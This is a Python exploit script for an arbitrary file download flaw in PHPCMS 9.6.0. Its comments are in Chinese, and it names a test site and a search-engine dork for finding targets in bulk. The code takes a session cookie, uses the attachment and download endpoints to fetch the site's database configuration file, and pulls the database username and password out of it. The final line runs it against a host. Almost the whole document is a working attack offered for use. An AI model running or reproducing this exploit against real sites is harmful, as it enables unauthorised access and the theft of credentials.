# coding:utf-8
# phpcms9.6.0 任意文件下载
# Test Url: http://www.jd-cg.com
# spider  inurl:/index.php?m=content

#C:\Users\Administrator\Desktop\py\tools\ShellFramework>python3 framework.py -k "inurl:/index.php?m=content&c=index&a=show&catid=17&id=" -p 10 -e baidu -l phpcms_down -o phpcmsdown.txt

import requests
from urllib.parse import quote
import re

TIMEOUT = 3

def poc(url):
    try:
        payload = r'&id=1&m=1&f=caches/configs/database.ph%3C&modelid=1&catid=1&s=&i=1&d=1&'           #数据库文件的路径
        #payload = r'&id=1&m=1&f=uploadfile/2017.ph%3C&modelid=1&catid=1&s=&i=1&d=1&'
        cookies = {}
        enc_payload = ''

        #获取cookies
        step1 = '{}/index.php?m=wap&c=index&siteid=1'.format(url)
        print('step1: {}'.format(step1))
        for c in requests.get(step1, timeout=TIMEOUT).cookies:
            #print('c : {}'.format(c))
            if c.name[-7:] == '_siteid':
                cookie_head = c.name[:6]
                cookies[cookie_head + '_userid'] = c.value
                cookies[c.name] = c.value
                print(cookies)

        #获取att_json
        step2 = '{}/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src={}'.format(url,quote(payload))
        print(step2)
        for c in requests.get(step2,timeout=TIMEOUT,cookies=cookies).cookies:
            if c.name[-9:] == '_att_json':
                enc_payload = c.value
                print(c)

        #访问下载链接
        step3 = '{}/index.php?m=content&c=down&a_k={}'.format(url,enc_payload)
        print(step3)
        ret = requests.get(step3,timeout=TIMEOUT,cookies=cookies)
        return cookies,ret.text

    except Exception as e:
        pass

class Exploit:
    def attack(self, url):
        try:
            cookies,ret = poc(url)
            cmp = r'<a href="(\S+)" class="xzs_btn">'
            link_params = re.search(cmp,ret).group(1)
            if link_params:
                link = r'{}/index.php{}'.format(url,link_params)
                dbContent = requests.get(link,cookies=cookies,timeout=TIMEOUT).text             #查看数据库内容
                #print(dbContent)
                username = re.search(r"'username' => '(.*?)',",dbContent).group(1)
                password = re.search(r"'password' => '(.*?)',",dbContent).group(1)

                return '{} -> username:{};password:{}'.format(url,username,password)
        except Exception as e:
            return None


print(Exploit().attack('http://demo.phpcms960.com/'))

